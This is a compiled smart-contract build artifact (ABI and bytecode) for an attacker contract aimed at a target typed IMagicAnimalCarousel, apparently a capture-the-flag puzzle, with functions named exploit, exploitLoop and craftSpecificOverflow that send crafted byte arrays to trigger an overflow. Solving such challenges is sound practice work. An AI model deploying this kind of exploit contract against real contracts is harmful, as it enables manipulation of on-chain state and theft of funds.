{"abi":[{"type":"constructor","inputs":[{"name":"_target","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"checkState","inputs":[],"outputs":[{"name":"currentId","type":"uint256","internalType":"uint256"},{"name":"maxCap","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"craftSpecificOverflow","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"exploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"exploitLoop","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"target","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IMagicAnimalCarousel"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051610736380380610736833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b6106b0806100865f395ff3fe608060405234801561000f575f5ffd5b5060043610610064575f3560e01c8063a87719e11161004d578063a87719e114610094578063d4b839921461009c578063f03798c8146100c6575f5ffd5b806363d9b7701461006857806396dfcbea14610072575b5f5ffd5b6100706100ce565b005b61007a61018f565b604080519283526020830191909152015b60405180910390f35b610070610292565b5f546100ae906001600160a01b031681565b6040516001600160a01b03909116815260200161008b565b61007061039a565b60408051600a8082528183019092525f916020820181803683370190505090505f5b600a81101561012e5760ff60f81b828281518110610110576101106105c3565b60200101906001600160f81b03191690815f1a9053506001016100f0565b505f54604051632acee48960e21b815282916001600160a01b03169063ab3b92249061015e9084906004016105f0565b5f604051808303815f87803b158015610175575f5ffd5b505af1158015610187573d5f5f3e3d5ffd5b505050505050565b5f8054604080517f26bad99e000000000000000000000000000000000000000000000000000000008152905183926001600160a01b0316916326bad99e9160048083019260209291908290030181865afa1580156101ef573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610213919061063b565b91505f5f9054906101000a90046001600160a01b03166001600160a01b0316633a5ddf306040518163ffffffff1660e01b8152600401602060405180830381865afa158015610264573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102889190610652565b61ffff1690509091565b60408051600c8082528183019092525f9160208201818036833701905050905060ff60f81b815f815181106102c9576102c96105c3565b60200101906001600160f81b03191690815f1a90535060ff60f81b816001815181106102f7576102f76105c3565b60200101906001600160f81b03191690815f1a905350600160f81b81600281518110610325576103256105c3565b60200101906001600160f81b03191690815f1a9053505f54604051632acee48960e21b81526001600160a01b039091169063ab3b92249061036a9084906004016105f0565b5f604051808303815f87803b158015610381575f5ffd5b505af1158015610393573d5f5f3e3d5ffd5b5050505050565b5f5f5f9054906101000a90046001600160a01b03166001600160a01b0316633a5ddf306040518163ffffffff1660e01b8152600401602060405180830381865afa1580156103ea573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061040e9190610652565b60408051600a8082528183019092529192505f91906020820181803683370190505090505f5b600a8110156104725760ff60f81b828281518110610454576104546105c3565b60200101906001600160f81b03191690815f1a905350600101610434565b505f54604051632acee48960e21b81526001600160a01b039091169063ab3b9224906104a29084906004016105f0565b5f604051808303815f87803b1580156104b9575f5ffd5b505af11580156104cb573d5f5f3e3d5ffd5b505f9250600a91506104da9050565b6040519080825280601f01601f191660200182016040528015610504576020820181803683370190505b50905060ff60f81b815f8151811061051e5761051e6105c3565b60200101906001600160f81b03191690815f1a90535060ff60f81b8160018151811061054c5761054c6105c3565b60200101906001600160f81b03191690815f1a9053505f54604051632acee48960e21b81526001600160a01b039091169063ab3b9224906105919084906004016105f0565b5f604051808303815f87803b1580156105a8575f5ffd5b505af11580156105ba573d5f5f3e3d5ffd5b50505050505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b602081525f82518060208401525f5b8181101561061c57602081860181015160408684010152016105ff565b505f604082850101526040601f19601f83011684010191505092915050565b5f6020828403121561064b575f5ffd5b5051919050565b5f60208284031215610662575f5ffd5b815161ffff81168114610673575f5ffd5b939250505056fea26469706673582212208c7ebb3288c9903a69fa11f79a9b5604c360731155bdb8201506f127aa59724464736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"checkState()":"96dfcbea","craftSpecificOverflow()":"a87719e1","exploit()":"63d9b770","exploitLoop()":"f03798c8","target()":"d4b83992"},"id":0}